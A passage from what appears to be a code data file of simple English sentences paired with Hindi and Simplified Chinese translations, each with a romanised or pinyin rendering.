                "Hindi": "शेफ ने मेहमानों के लिए स्वादिष्ट भोजन तैयार किया। (Chef ne mehmano ke liye swaadisht bhojan tayar kiya.)",
                "Chinese (Simplified)": "厨师为客人准备了美味的餐点。 (Chúshī wèi kèrén zhǔnbèile měiwèi de cāndiǎn.)"
            },
            "the sunset painted the sky with beautiful colors.": {
                "Hindi": "सूर्यास्त ने आकाश को सुंदर रंगों से रंग दिया। (Suryasta ne aakash ko sundar rangon se rang diya.)",
                "Chinese (Simplified)": "夕阳将天空染上了美丽的色彩。 (Xīyáng jiāng tiānkōng rǎn shàngle měilì de sècǎi.)"
            },
            "the student asked a thoughtful question during the lecture.": {
                "Hindi": "छात्र ने व्याख्यान के दौरान एक विचारशील प्रश्न पूछा। (Chhatr ne vyakhyan ke dauran ek vicharshil prashna poocha.)",
                "Chinese (Simplified)": "学生在讲座中提出了一个深思熟虑的问题。 (Xuéshēng zài jiǎngzuò zhōng tíchūle yīgè shēn sī shú lǜ de wèntí.)"
            },
            "the bird flew gracefully across the sky.": {
                "Hindi": "पक्षी आकाश में सुंदरता से उड़ते हुए गया। (Pakshi aakash mein sundarta se udte hue gaya.)",
                "Chinese (Simplified)": "鸟优雅地飞过天空。 (Niǎo yōuyǎ de fēiguò tiānkōng.)"
            },
            "she was filled with joy after hearing the good news.": {
                "Hindi": "उसे खुशखबरी सुनकर खुशी से भर गई। (Use khushkhabri sunkar khushi se bhar gayi.)",
                "Chinese (Simplified)": "她听到好消息后充满了喜悦。 (Tā tīngdào hǎo xiāoxī hòu chōngmǎnle xǐyuè.)"
            },
            "the mountain hike was both challenging and rewarding.": {
                "Hindi": "पहाड़ की चढ़ाई चुनौतीपूर्ण और संतोषजनक थी। (Pahaad ki chadhai chunautipurn aur santoshjanak thi.)",
                "Chinese (Simplified)": "登山既具有挑战性又充满了回报。 (Dēngshān jì jùyǒu tiǎozhàn xìng yòu chōngmǎnle huíbào.)"
            },
            "he wore a bright red shirt to the party.": {
                "Hindi": "उसने पार्टी में एक चमकदार लाल शर्ट पहनी। (Usne party mein ek chamakdaar laal shirt pehni.)",
                "Chinese (Simplified)": "他穿了一件鲜红色的衬衫去参加聚会。 (Tā chuānle yī jiàn xiān hóng sè de chènshān qù cānjiā jùhuì.)"
            },
            "the moonlight reflected off the surface of the lake.": {
                "Hindi": "चाँदनी झील की सतह पर परिलक्षित हो रही थी। (Chaandani jheel ki satah par parilakshit ho rahi thi.)",
                "Chinese (Simplified)": "月光照在湖面上。 (Yuèguāng zhào zài hùmiàn shàng.)"
            },
            "the flowers in the garden bloomed beautifully in spring.": {
                "Hindi": "गार्डन में फूल वसंत में सुंदरता से खिले। (Garden mein phool vasant mein sundarta se khile.)",
                "Chinese (Simplified)": "花园里的花在春天盛开得很美丽。 (Huāyuán lǐ de huā zài chūntiān shèngkāi dé hěn měilì.)"
            },
            "they traveled across the country to visit their family.": {
                "Hindi": "उन्होंने अपने परिवार से मिलने के लिए पूरे देश में यात्रा की। (Unhone apne parivaar se milne ke liye poore desh mein yatra ki.)",
                "Chinese (Simplified)": "他们穿越全国去拜访家人。 (Tāmen chuānyuè quánguó qù bàifǎng jiārén.)"
            },
            "the scientist made a groundbreaking discovery in the lab.": {
                "Hindi": "वैज्ञानिक ने प्रयोगशाला में एक क्रांतिकारी खोज की। (Vaigyanik ne prayogshala mein ek krantikari khoj ki.)",
                "Chinese (Simplified)": "科学家在实验室做出了突破性的发现。 (Kēxuéjiā zài shíyànshì zuòchūle tūpò xìng de fāxiàn.)"
            },
            "the book was so captivating that I couldn't put it down.": {
                "Hindi": "किताब इतनी दिलचस्प थी कि मैं उसे छोड़ नहीं सका। (Kitaab itni dilchasp thi ki main use chhod nahi saka.)",
                "Chinese (Simplified)": "这本书非常吸引人，我无法放下它。 (Zhè běn shū fēicháng xīyǐn rén, wǒ wúfǎ fàngxià tā.)"
            },
            "the children were excited to go on their first field trip.": {
                "Hindi": "बच्चे अपनी पहली फील्ड ट्रिप पर जाने के लिए उत्साहित थे। (Bachche apni pehli field trip par jaane ke liye utsahit the.)",
                "Chinese (Simplified)": "孩子们兴奋地准备去他们的第一次实地考察。 (Háizimen xīngfèn de zhǔnbèi qù tāmen de dì yī cì shídì kǎochá.)"
            },
            "the party was a huge success with everyone dancing and laughing.": {
                "Hindi": "पार्टी एक बड़ी सफलता रही, सभी लोग नाच रहे थे और हंसी मजाक कर रहे थे। (Party ek badi safalta rahi, sabhi log naach rahe the aur hansi mazaak kar rahe the.)",
                "Chinese (Simplified)": "派对非常成功，大家都在跳舞和笑声中度过。 (Pàiduì fēicháng chénggōng, dàjiā dōu zài tiàowǔ hé xiàoshēng zhōng dùguò.)"
            },
            "she loves to read books about adventure and exploration.": {
                "Hindi": "वह साहसिकता और अन्वेषण पर आधारित किताबें पढ़ना पसंद करती है। (Woh saahasikta aur anveshan par aadharit kitaabein padhna pasand karti hai.)",
                "Chinese (Simplified)": "她喜欢阅读关于冒险和探索的书籍。 (Tā xǐhuān yuèdú guānyú màoxiǎn hé tànsuǒ de shūjí.)"
            },
            "the ocean was calm and peaceful, with the waves gently lapping the shore.": {
                "Hindi": "समुद्र शांत और शांतिपूर्ण था, लहरें धीरे-धीरे किनारे से टकरा रही थीं। (Samudra shaant aur shaantipoorn tha, lahrain dheere-dheere kinare se takra rahi thin.)",
                "Chinese (Simplified)": "海洋平静而宁静，海浪轻轻拍打着海岸。 (Hǎiyáng píngjìng ér níngjìng, hǎilàng qīngqīng pāi dǎzhe hǎi'àn.)"
            },
            "he runs fast.": {
                "Hindi": "वह तेज दौड़ता है। (Vah tez daudta hai.)",
                "Chinese (Simplified)": "他跑得很快。 (Tā pǎo dé hěn kuài.)"
            },
            "she is reading a book.": {
                "Hindi": "वह एक किताब पढ़ रही है। (Vah ek kitaab padh rahi hai.)",
                "Chinese (Simplified)": "她在读一本书。 (Tā zài dú yī běn shū.)"
            },
            "it is raining today.": {
                "Hindi": "आज बारिश हो रही है। (Aaj baarish ho rahi hai.)",
                "Chinese (Simplified)": "今天下雨。 (Jīntiān xià yǔ.)"
            },
            "he is my friend.": {
                "Hindi": "वह मेरा दोस्त है। (Vah mera dost hai.)",
                "Chinese (Simplified)": "他是我的朋友。 (Tā shì wǒ de péngyǒu.)"
            },
            "I like pizza.": {
                "Hindi": "मुझे पिज़्ज़ा पसंद है। (Mujhe pizza pasand hai.)",
                "Chinese (Simplified)": "我喜欢披萨。 (Wǒ xǐhuān pīsà.)"
            },
            "the sun is shining.": {
                "Hindi": "सूरज चमक रहा है। (Suraj chamak raha hai.)",
                "Chinese (Simplified)": "太阳在照耀。 (Tàiyáng zài zhàoyào.)"
            },
            "she sings beautifully.": {
                "Hindi": "वह सुंदर गाती है। (Vah sundar gaati hai.)",
                "Chinese (Simplified)": "她唱得很美。 (Tā chàng dé hěn měi.)"
            },
            "the cat is sleeping.": {
                "Hindi": "बिल्ली सो रही है। (Billi so rahi hai.)",
                "Chinese (Simplified)": "猫正在睡觉。 (Māo zhèngzài shuìjiào.)"
            },
            "he is tall.": {
                "Hindi": "वह लंबा है। (Vah lamba hai.)",
                "Chinese (Simplified)": "他很高。 (Tā hěn gāo.)"
            },
            "I am hungry.": {
                "Hindi": "मुझे भूख लगी है। (Mujhe bhukh lagi hai.)",
                "Chinese (Simplified)": "我饿了。 (Wǒ è le.)"
            },
            "it is a gift.": {
                "Hindi": "यह एक उपहार है। (Yeh ek uphaar hai.)",
                "Chinese (Simplified)": "这是一个礼物。 (Zhè shì yīgè lǐwù.)"
            },
            "she has a dog.": {
                "Hindi": "उसके पास एक कुत्ता है। (Uske paas ek kutta hai.)",
                "Chinese (Simplified)": "她有一只狗。 (Tā yǒu yī zhī gǒu.)"
            },
            "he is playing.": {
                "Hindi": "वह खेल रहा है। (Vah khel raha hai.)",
                "Chinese (Simplified)": "他在玩。 (Tā zài wán.)"
            },
            "the door is open.": {
                "Hindi": "दरवाजा खुला है। (Darwaza khula hai.)",
                "Chinese (Simplified)": "门是开着的。 (Mén shì kāizhe de.)"
            },
            "I am learning.": {
                "Hindi": "मैं सीख रहा हूँ। (Main seekh raha hoon.)",
                "Chinese (Simplified)": "我在学习。 (Wǒ zài xuéxí.)"
            },
            "she is happy.": {
                "Hindi": "वह खुश है। (Vah khush hai.)",
                "Chinese (Simplified)": "她很高兴。 (Tā hěn gāoxìng.)"
            },
            "the dog is barking.": {
                "Hindi": "कुत्ता भौंक रहा है। (Kutta bhonk raha hai.)",
                "Chinese (Simplified)": "狗在叫。 (Gǒu zài jiào.)"
            },
            "I am tired.": {
                "Hindi": "मैं थका हुआ हूँ। (Main thaka hua hoon.)",
                "Chinese (Simplified)": "我累了。 (Wǒ lèi le.)"
            },
            "he is running.": {
                "Hindi": "वह दौड़ रहा है। (Vah daud raha hai.)",
                "Chinese (Simplified)": "他在跑。 (Tā zài pǎo.)"
            },
            "this is mine.": {
                "Hindi": "यह मेरा है। (Yeh mera hai.)",
                "Chinese (Simplified)": "这是我的。 (Zhè shì wǒ de.)"
            },
            "I am busy.": {
                "Hindi": "मैं व्यस्त हूँ। (Main vyast hoon.)",
                "Chinese (Simplified)": "我很忙。 (Wǒ hěn máng.)"
            },
            "she is tall.": {
                "Hindi": "वह लंबी है। (Vah lambi hai.)",
                "Chinese (Simplified)": "她很高。 (Tā hěn gāo.)"
            },
            "he is sleeping.": {
                "Hindi": "वह सो रहा है। (Vah so raha hai.)",
                "Chinese (Simplified)": "他在睡觉。 (Tā zài shuìjiào.)"
            },
            "the book is new.": {
                "Hindi": "किताब नई है। (Kitaab nai hai.)",
                "Chinese (Simplified)": "这本书是新的。 (Zhè běn shū shì xīn de.)"
            },
            "it is cold.": {
                "Hindi": "यह ठंडा है। (Yeh thanda hai.)",
                "Chinese (Simplified)": "天气很冷。 (Tiānqì hěn lěng.)"
            },
            "they are friends.": {
                "Hindi": "वे दोस्त हैं। (Ve dost hain.)",
                "Chinese (Simplified)": "他们是朋友。 (Tāmen shì péngyǒu.)"
            },
            "I am learning Python.": {
                "Hindi": "मैं पायथन सीख रहा हूँ। (Main Python seekh raha hoon.)",
                "Chinese (Simplified)": "我在学习Python。 (Wǒ zài xuéxí Python.)"
            },
            "the sky is blue.": {
                "Hindi": "आसमान नीला है। (Aasmaan neela hai.)",
                "Chinese (Simplified)": "天空是蓝色的。 (Tiānkōng shì lán sè de.)"
            },
            "it is a pen.": {
                "Hindi": "यह एक पेन है। (Yeh ek pen hai.)",
                "Chinese (Simplified)": "这是一支笔。 (Zhè shì yī zhī bǐ.)"
            },
            "i am happy.": {
                "Hindi": "मैं खुश हूँ। (Main khush hoon.)",
                "Chinese (Simplified)": "我很高兴。 (Wǒ hěn gāoxìng.)"
            },
            "she loves animals.": {
                "Hindi": "वह जानवरों से प्यार करती है। (Vah janwaron se pyaar karti hai.)",
                "Chinese (Simplified)": "她喜欢动物。 (Tā xǐhuān dòngwù.)"
            },
            "he is a teacher.": {
                "Hindi": "वह एक शिक्षक है। (Vah ek shikshak hai.)",
                "Chinese (Simplified)": "他是一个老师。 (Tā shì yīgè lǎoshī.)"
            },
            "i have a car.": {
                "Hindi": "मेरे पास एक कार है। (Mere paas ek car hai.)",
                "Chinese (Simplified)": "我有一辆车。 (Wǒ yǒu yī liàng chē.)"
            },
            "this is easy.": {
                "Hindi": "यह आसान है। (Yeh aasan hai.)",
                "Chinese (Simplified)": "这很容易。 (Zhè hěn róngyì.)"
            },
            "the coffee is hot.": {
                "Hindi": "कॉफ़ी गरम है। (Coffee garam hai.)",
                "Chinese (Simplified)": "咖啡很热。 (Kāfēi hěn rè.)"
            },
            "she is smiling.": {
                "Hindi": "वह मुस्करा रही है। (Vah muskara rahi hai.)",
                "Chinese (Simplified)": "她在微笑。 (Tā zài wēixiào.)"
            },
            "i like movies.": {
                "Hindi": "मुझे फिल्में पसंद हैं। (Mujhe filmein pasand hain.)",
                "Chinese (Simplified)": "我喜欢电影。 (Wǒ xǐhuān diànyǐng.)"
            },
            "he is playing football.": {
                "Hindi": "वह फुटबॉल खेल रहा है। (Vah football khel raha hai.)",
                "Chinese (Simplified)": "他在踢足球。 (Tā zài tī zúqiú.)"
            },
            "they are singing.": {
                "Hindi": "वे गा रहे हैं। (Ve ga rahe hain.)",
                "Chinese (Simplified)": "他们在唱歌。 (Tāmen zài chànggē.)"
            },
            "i am learning English.": {
                "Hindi": "मैं अंग्रेजी सीख रहा हूँ। (Main angrezi seekh raha hoon.)",
                "Chinese (Simplified)": "我在学习英语。 (Wǒ zài xuéxí yīngyǔ.)"
            },
            "it is a dog.": {
                "Hindi": "यह एक कुत्ता है। (Yeh ek kutta hai.)",
                "Chinese (Simplified)": "这是一只狗。 (Zhè shì yī zhī gǒu.)"
            },
            "he is tall and strong.": {
                "Hindi": "वह लंबा और मजबूत है। (Vah lamba aur majboot hai.)",
                "Chinese (Simplified)": "他又高又强壮。 (Tā yòu gāo yòu qiángzhuàng.)"
            },
            "she is reading a story.": {
                "Hindi": "वह एक कहानी पढ़ रही है। (Vah ek kahani padh rahi hai.)",
                "Chinese (Simplified)": "她在读一个故事。 (Tā zài dú yīgè gùshì.)"
            },
            "the book is interesting.": {
                "Hindi": "किताब दिलचस्प है। (Kitaab dilchasp hai.)",
                "Chinese (Simplified)": "这本书很有趣。 (Zhè běn shū hěn yǒuqù.)"
            },
            "he is always helpful.": {
                "Hindi": "वह हमेशा मददगार रहता है। (Vah hamesha madadgaar rehta hai.)",
                "Chinese (Simplified)": "他总是乐于助人。 (Tā zǒng shì lè yú zhùrén.)"
            },
            "i am thirsty.": {
                "Hindi": "मुझे प्यास लगी है। (Mujhe pyaas lagi hai.)",
                "Chinese (Simplified)": "我渴了。 (Wǒ kě le.)"
            },
            "the sun is shining.": {
                "Hindi": "सूरज चमक रहा है। (Suraj chamak raha hai.)",
                "Chinese (Simplified)": "太阳在照耀。 (Tàiyáng zài zhàoyào.)"
            },
            "she is my friend.": {
                "Hindi": "वह मेरी दोस्त है। (Vah meri dost hai.)",
                "Chinese (Simplified)": "她是我的朋友。 (Tā shì wǒ de péngyǒu.)"
            },
            "it is raining.": {
                "Hindi": "बारिश हो रही है। (Barish ho rahi hai.)",
                "Chinese (Simplified)": "在下雨。 (Zài xiàyǔ.)"
            },
            "he is busy.": {
                "Hindi": "वह व्यस्त है। (Vah vyast hai.)",
                "Chinese (Simplified)": "他很忙。 (Tā hěn máng.)"
            },
            "she likes chocolate.": {
                "Hindi": "वह चॉकलेट पसंद करती है। (Vah chocolate pasand karti hai.)",
                "Chinese (Simplified)": "她喜欢巧克力。 (Tā xǐhuān qiǎokèlì.)"
            },
            "I am learning to swim.": {
                "Hindi": "मैं तैरना सीख रहा हूँ। (Main tairna seekh raha hoon.)",
                "Chinese (Simplified)": "我在学游泳。 (Wǒ zài xué yóuyǒng.)"
            },
            "this is my house.": {
                "Hindi": "यह मेरा घर है। (Yeh mera ghar hai.)",
                "Chinese (Simplified)": "这是我的家。 (Zhè shì wǒ de jiā.)"
            },
            "the food is delicious.": {
                "Hindi": "खाना स्वादिष्ट है। (Khana swadisht hai.)",
                "Chinese (Simplified)": "食物很美味。 (Shíwù hěn měiwèi.)"
            },
            "I love music.": {
                "Hindi": "मुझे संगीत पसंद है। (Mujhe sangeet pasand hai.)",
                "Chinese (Simplified)": "我喜欢音乐。 (Wǒ xǐhuān yīnyuè.)"
            },
            "he is reading a book.": {
                "Hindi": "वह एक किताब पढ़ रहा है। (Vah ek kitaab padh raha hai.)",
                "Chinese (Simplified)": "他在读一本书。 (Tā zài dú yī běn shū.)"
            },
            "they are laughing.": {
                "Hindi": "वे हंस रहे हैं। (Ve hans rahe hain.)",
                "Chinese (Simplified)": "他们在笑。 (Tāmen zài xiào.)"
            },
            "I am going to the market.": {
                "Hindi": "मैं बाजार जा रहा हूँ। (Main bazaar ja raha hoon.)",
                "Chinese (Simplified)": "我去市场。 (Wǒ qù shìchǎng.)"
            },
            "it is a beautiful day.": {
                "Hindi": "यह एक सुंदर दिन है। (Yeh ek sundar din hai.)",
                "Chinese (Simplified)": "今天是美好的一天。 (Jīntiān shì měihǎo de yītiān.)"
            },
            "I have a question.": {
                "Hindi": "मेरे पास एक सवाल है। (Mere paas ek sawaal hai.)",
                "Chinese (Simplified)": "我有一个问题。 (Wǒ yǒu yīgè wèntí.)"
            },
            "this is my book.": {
                "Hindi": "यह मेरी किताब है। (Yeh meri kitaab hai.)",
                "Chinese (Simplified)": "这是我的书。 (Zhè shì wǒ de shū.)"
            },
            "I like to run.": {
                "Hindi": "मुझे दौड़ना पसंद है। (Mujhe daudna pasand hai.)",
                "Chinese (Simplified)": "我喜欢跑步。 (Wǒ xǐhuān pǎobù.)"
            },
            "he is a good singer.": {
                "Hindi": "वह एक अच्छा गायक है। (Vah ek accha gaayak hai.)",
                "Chinese (Simplified)": "他是个好歌手。 (Tā shì gè hǎo gēshǒu.)"
            },
            "she loves the rain.": {
                "Hindi": "वह बारिश को पसंद करती है। (Vah baarish ko pasand karti hai.)",
                "Chinese (Simplified)": "她喜欢雨。 (Tā xǐhuān yǔ.)"
            },
            "the cake is sweet.": {
                "Hindi": "केक मीठा है। (Cake meetha hai.)",
                "Chinese (Simplified)": "蛋糕很甜。 (Dàngāo hěn tián.)"
            },
            "it is too hot today.": {
                "Hindi": "आज बहुत गर्म है। (Aaj bahut garm hai.)",
                "Chinese (Simplified)": "今天太热了。 (Jīntiān tài rè le.)"
            },
            "I am feeling happy.": {
                "Hindi": "मैं खुश महसूस कर रहा हूँ। (Main khush mehsoos kar raha hoon.)",
                "Chinese (Simplified)": "我感觉很高兴。 (Wǒ gǎnjué hěn gāoxìng.)"
            },
            "he is my brother.": {
                "Hindi": "वह मेरा भाई है। (Vah mera bhai hai.)",
                "Chinese (Simplified)": "他是我的兄弟。 (Tā shì wǒ de xiōngdì.)"
            },
            "she is very kind.": {
                "Hindi": "वह बहुत दयालु है। (Vah bahut dayalu hai.)",
                "Chinese (Simplified)": "她非常善良。 (Tā fēicháng shànliáng.)"
            },
            "I love to dance.": {
                "Hindi": "मुझे नृत्य करना पसंद है। (Mujhe nritya karna pasand hai.)",
                "Chinese (Simplified)": "我喜欢跳舞。 (Wǒ xǐhuān tiàowǔ.)"
            },
            "he is always punctual.": {
                "Hindi": "वह हमेशा समय पर रहता है। (Vah hamesha samay par rehta hai.)",
                "Chinese (Simplified)": "他总是准时。 (Tā zǒng shì zhǔnshí.)"
            },
            "she has a cat.": {
                "Hindi": "उसके पास एक बिल्ली है। (Uske paas ek billi hai.)",
                "Chinese (Simplified)": "她有一只猫。 (Tā yǒu yī zhī māo.)"
            },
            "I enjoy reading books.": {
                "Hindi": "मुझे किताबें पढ़ना पसंद है। (Mujhe kitaabein padhna pasand hai.)",
                "Chinese (Simplified)": "我喜欢读书。 (Wǒ xǐhuān dúshū.)"
            },
            "this is my phone.": {
                "Hindi": "यह मेरा फोन है। (Yeh mera phone hai.)",
                "Chinese (Simplified)": "这是我的手机。 (Zhè shì wǒ de shǒujī.)"
            },
            "he is an engineer.": {
                "Hindi": "वह एक इंजीनियर है। (Vah ek engineer hai.)",
                "Chinese (Simplified)": "他是一个工程师。 (Tā shì yīgè gōngchéngshī.)"
            },
            "the book is interesting.": {
                "Hindi": "किताब दिलचस्प है। (Kitaab dilchasp hai.)",
                "Chinese (Simplified)": "这本书很有趣。 (Zhè běn shū hěn yǒuqù.)"
            },
            "i like ice cream.": {
                "Hindi": "मुझे आइस क्रीम पसंद है। (Mujhe ice cream pasand hai.)",
                "Chinese (Simplified)": "我喜欢冰淇淋。 (Wǒ xǐhuān bīngqílín.)"
            },
            "the cat is sleeping.": {
                "Hindi": "बिल्ली सो रही है। (Billi so rahi hai.)",
                "Chinese (Simplified)": "猫在睡觉。 (Māo zài shuìjiào.)"
            },
            "she is very smart.": {
                "Hindi": "वह बहुत स्मार्ट है। (Vah bahut smart hai.)",
                "Chinese (Simplified)": "她非常聪明。 (Tā fēicháng cōngmíng.)"
            },
            "it is a sunny day.": {
                "Hindi": "आज एक धूप वाला दिन है। (Aaj ek dhoop wala din hai.)",
                "Chinese (Simplified)": "今天是晴天。 (Jīntiān shì qíngtiān.)"
            },
            "i enjoy listening to music.": {
                "Hindi": "मुझे संगीत सुनना पसंद है। (Mujhe sangeet sunna pasand hai.)",
                "Chinese (Simplified)": "我喜欢听音乐。 (Wǒ xǐhuān tīng yīnyuè.)"
            },
            "he is a good cook.": {
                "Hindi": "वह एक अच्छा रसोइया है। (Vah ek accha rasoiya hai.)",
                "Chinese (Simplified)": "他是个好厨师。 (Tā shì gè hǎo chúshī.)"
            },
            "she is my teacher.": {
                "Hindi": "वह मेरी शिक्षिका है। (Vah meri shikshika hai.)",
                "Chinese (Simplified)": "她是我的老师。 (Tā shì wǒ de lǎoshī.)"
            },
            "i have a new phone.": {
                "Hindi": "मेरे पास एक नया फोन है। (Mere paas ek naya phone hai.)",
                "Chinese (Simplified)": "我有一部新手机。 (Wǒ yǒu yī bù xīn shǒujī.)"
            },
            "the movie was exciting.": {
                "Hindi": "फिल्म रोमांचक थी। (Film romanchak thi.)",
                "Chinese (Simplified)": "这部电影很刺激。 (Zhè bù diànyǐng hěn cìjī.)"
            },
            "i like playing soccer.": {
                "Hindi": "मुझे फुटबॉल खेलना पसंद है। (Mujhe football khelna pasand hai.)",
                "Chinese (Simplified)": "我喜欢踢足球。 (Wǒ xǐhuān tī zúqiú.)"
            },
            "he is my friend.": {
                "Hindi": "वह मेरा दोस्त है। (Vah mera dost hai.)",
                "Chinese (Simplified)": "他是我的朋友。 (Tā shì wǒ de péngyǒu.)"
            },
            "it is my turn.": {
                "Hindi": "यह मेरी बारी है। (Yeh meri baari hai.)",
                "Chinese (Simplified)": "轮到我了。 (Lún dào wǒ le.)"
            },
            "she is very happy.": {
                "Hindi": "वह बहुत खुश है। (Vah bahut khush hai.)",
                "Chinese (Simplified)": "她非常高兴。 (Tā fēicháng gāoxìng.)"
            },
            "he likes to read books.": {
                "Hindi": "उसे किताबें पढ़ना पसंद है। (Use kitaabein padhna pasand hai.)",
                "Chinese (Simplified)": "他喜欢读书。 (Tā xǐhuān dúshū.)"
            },
            "she runs every morning.": {
                "Hindi": "वह हर सुबह दौड़ती है। (Vah har subah daudti hai.)",
                "Chinese (Simplified)": "她每天早上跑步。 (Tā měitiān zǎoshàng pǎobù.)"
            },
            "the dog is barking loudly.": {
                "Hindi": "कुत्ता जोर से भौंक रहा है। (Kutta zor se bhauk raha hai.)",
                "Chinese (Simplified)": "狗在大声吠叫。 (Gǒu zài dàshēng fèijiào.)"
            },
            "the sky is very clear today.": {
                "Hindi": "आसमान आज बहुत साफ है। (Aasman aaj bahut saaf hai.)",
                "Chinese (Simplified)": "今天天空非常清澈。 (Jīntiān tiānkōng fēicháng qīngchè.)"
            },
            "he is playing football.": {
                "Hindi": "वह फुटबॉल खेल रहा है। (Vah football khel raha hai.)",
                "Chinese (Simplified)": "他在踢足球。 (Tā zài tī zúqiú.)"
            },
            "this is my favorite color.": {
                "Hindi": "यह मेरा पसंदीदा रंग है। (Yeh mera pasandida rang hai.)",
                "Chinese (Simplified)": "这是我最喜欢的颜色。 (Zhè shì wǒ zuì xǐhuān de yánsè.)"
            },
            "she has a beautiful smile.": {
                "Hindi": "उसकी मुस्कान बहुत खूबसूरत है। (Uski muskaan bahut khoobsurat hai.)",
                "Chinese (Simplified)": "她有一个美丽的微笑。 (Tā yǒu yīgè měilì de wēixiào.)"
            },
            "he is an excellent swimmer.": {
                "Hindi": "वह एक उत्कृष्ट तैराक है। (Vah ek utkṛṣṭ tairāk hai.)",
                "Chinese (Simplified)": "他是一个优秀的游泳者。 (Tā shì yīgè yōuxiù de yóuyǒng zhě.)"
            },
            "the teacher is very helpful.": {
                "Hindi": "शिक्षक बहुत मददगार है। (Shikshak bahut madadgar hai.)",
                "Chinese (Simplified)": "老师非常乐于助人。 (Lǎoshī fēicháng lè yú zhùrén.)"
            },
            "she is very creative.": {
                "Hindi": "वह बहुत रचनात्मक है। (Vah bahut rachnatmak hai.)",
                "Chinese (Simplified)": "她非常有创造力。 (Tā fēicháng yǒu chuàngzàolì.)"
            },
            "the sun is setting.": {
                "Hindi": "सूरज डूब रहा है। (Suraj doob raha hai.)",
                "Chinese (Simplified)": "太阳正在落下。 (Tàiyáng zhèngzài luòxià.)"
            },
            "she is very intelligent.": {
                "Hindi": "वह बहुत बुद्धिमान है। (Vah bahut buddhimaan hai.)",
                "Chinese (Simplified)": "她非常聪明。 (Tā fēicháng cōngmíng.)"
            },
            "the train is arriving soon.": {
                "Hindi": "ट्रेन जल्दी आ रही है। (Train jaldi aa rahi hai.)",
                "Chinese (Simplified)": "火车马上就要到了。 (Huǒchē mǎshàng jiù yào dào le.)"
            },
            "i love playing video games.": {
                "Hindi": "मुझे वीडियो गेम खेलना पसंद है। (Mujhe video game khelna pasand hai.)",
                "Chinese (Simplified)": "我喜欢玩电子游戏。 (Wǒ xǐhuān wán diànzǐ yóuxì.)"
            },
            "the book is on the table.": {
                "Hindi": "किताब मेज पर है। (Kitaab mez par hai.)",
                "Chinese (Simplified)": "书在桌子上。 (Shū zài zhuōzi shàng.)"
            },
            "the food smells delicious.": {
                "Hindi": "खाना स्वादिष्ट महक रहा है। (Khana swadisht mahak raha hai.)",
                "Chinese (Simplified)": "食物闻起来很美味。 (Shíwù wén qǐlái hěn měiwèi.)"
            },
            "he loves playing chess.": {
                "Hindi": "उसे शतरंज खेलना पसंद है। (Use shatranj khelna pasand hai.)",
                "Chinese (Simplified)": "他喜欢下棋。 (Tā xǐhuān xià qí.)"
            },
            "the coffee is too hot.": {
                "Hindi": "कॉफी बहुत गर्म है। (Coffee bahut garm hai.)",
                "Chinese (Simplified)": "咖啡太热了。 (Kāfēi tài rè le.)"
            },
            "the children are playing outside.": {
                "Hindi": "बच्चे बाहर खेल रहे हैं। (Bachche baahar khel rahe hain.)",
                "Chinese (Simplified)": "孩子们在外面玩。 (Háizimen zài wàimiàn wán.)"
            },
            "I like to travel.": {
                "Hindi": "मुझे यात्रा करना पसंद है। (Mujhe yatra karna pasand hai.)",
                "Chinese (Simplified)": "我喜欢旅行。 (Wǒ xǐhuān lǚxíng.)"
            },
            "the moon is shining bright.": {
                "Hindi": "चाँद तेज़ी से चमक रहा है। (Chaand tezī se chamak raha hai.)",
                "Chinese (Simplified)": "月亮在亮闪闪地照耀。 (Yuèliàng zài liàng shǎnshǎn de zhàoyào.)"
            },
            "she speaks three languages.": {
                "Hindi": "वह तीन भाषाएँ बोलती है। (Vah teen bhashayein bolti hai.)",
                "Chinese (Simplified)": "她会说三种语言。 (Tā huì shuō sān zhǒng yǔyán.)"
            },
            "he is reading a newspaper.": {
                "Hindi": "वह एक अखबार पढ़ रहा है। (Vah ek akhbaar padh raha hai.)",
                "Chinese (Simplified)": "他在读报纸。 (Tā zài dú bàozhǐ.)"
            },
            "it is a beautiful day.": {
                "Hindi": "आज एक खूबसूरत दिन है। (Aaj ek khoobsurat din hai.)",
                "Chinese (Simplified)": "今天是美丽的一天。 (Jīntiān shì měilì de yītiān.)"
            },
            "he is a great artist.": {
                "Hindi": "वह एक महान कलाकार है। (Vah ek mahaan kalakaar hai.)",
                "Chinese (Simplified)": "他是一个伟大的艺术家。 (Tā shì yīgè wěidà de yìshùjiā.)"
            },
            "i am feeling sleepy.": {
                "Hindi": "मुझे नींद आ रही है। (Mujhe neend aa rahi hai.)",
                "Chinese (Simplified)": "我觉得困。 (Wǒ juédé kùn.)"
            },
            "the book is very interesting.": {
                "Hindi": "किताब बहुत दिलचस्प है। (Kitaab bahut dilchasp hai.)",
                "Chinese (Simplified)": "这本书非常有趣。 (Zhè běn shū fēicháng yǒuqù.)"
            },
            "she is going to the market.": {
                "Hindi": "वह बाजार जा रही है। (Vah bazaar ja rahi hai.)",
                "Chinese (Simplified)": "她要去市场。 (Tā yào qù shìchǎng.)"
            },
            "they are watching a movie.": {
                "Hindi": "वे एक फिल्म देख रहे हैं। (Ve ek film dekh rahe hain.)",
                "Chinese (Simplified)": "他们在看电影。 (Tāmen zài kàn diànyǐng.)"
            },
            "the cat is sleeping on the couch.": {
                "Hindi": "बिल्ली सोफे पर सो रही है। (Billi sofe par so rahi hai.)",
                "Chinese (Simplified)": "猫正在沙发上睡觉。 (Māo zhèngzài shāfā shàng shuìjiào.)"
            },
            "she has a new phone.": {
                "Hindi": "उसके पास नया फोन है। (Uske paas naya phone hai.)",
                "Chinese (Simplified)": "她有一部新手机。 (Tā yǒu yī bù xīn shǒujī.)"
            },
            "the children are laughing.": {
                "Hindi": "बच्चे हंसी कर रहे हैं। (Bachche hansi kar rahe hain.)",
                "Chinese (Simplified)": "孩子们在笑。 (Háizimen zài xiào.)"
            },
            "i love the rain.": {
                "Hindi": "मुझे बारिश पसंद है। (Mujhe baarish pasand hai.)",
                "Chinese (Simplified)": "我喜欢雨天。 (Wǒ xǐhuān yǔtiān.)"
            },
            "this chair is very comfortable.": {
                "Hindi": "यह कुर्सी बहुत आरामदायक है। (Yeh kursi bahut aaraamdayak hai.)",
                "Chinese (Simplified)": "这把椅子非常舒适。 (Zhè bǎ yǐzi fēicháng shūshì.)"
            },
            "they are singing a song.": {
                "Hindi": "वे एक गाना गा रहे हैं। (Ve ek gaana gaa rahe hain.)",
                "Chinese (Simplified)": "他们在唱歌。 (Tāmen zài chàng gē.)"
            },
            "i am going to bed.": {
                "Hindi": "मैं सोने जा रहा हूँ। (Main sone ja raha hoon.)",
                "Chinese (Simplified)": "我要去睡觉了。 (Wǒ yào qù shuìjiào le.)"
            },
            "the shop is closed today.": {
                "Hindi": "दुकान आज बंद है। (Dukaan aaj band hai.)",
